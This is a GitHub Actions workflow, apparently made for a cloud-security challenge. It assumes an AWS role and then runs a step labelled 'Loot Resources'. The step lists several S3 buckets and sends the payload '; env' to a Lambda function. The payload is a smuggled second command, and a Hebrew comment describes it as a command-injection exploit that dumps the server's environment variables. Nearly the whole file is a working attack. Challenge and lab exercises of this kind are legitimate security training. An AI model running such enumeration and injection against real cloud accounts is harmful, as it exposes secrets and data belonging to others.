name: Challenge Auth Fixed
on: [push]

jobs:
  auth-job:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1
          audience: ://amazonaws.com

      - name: Loot Resources
        run: |
          echo "=== Scanning S3 Buckets ==="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ || true
          aws s3 ls s3://codec4f26c862a321ef5/ || true
          aws s3 ls s3://site781fe43f26b9eba3/ || true
          
          echo "=== Testing Lambda Exploitation ==="
          # שליחת אירוע המנצל את ה-Command Injection כדי להדפיס את קובצי השרת או ה-env
          aws lambda invoke --function-name nslookupv2 --payload '{"domain": "; env"}' response.json || true
          cat response.json || true
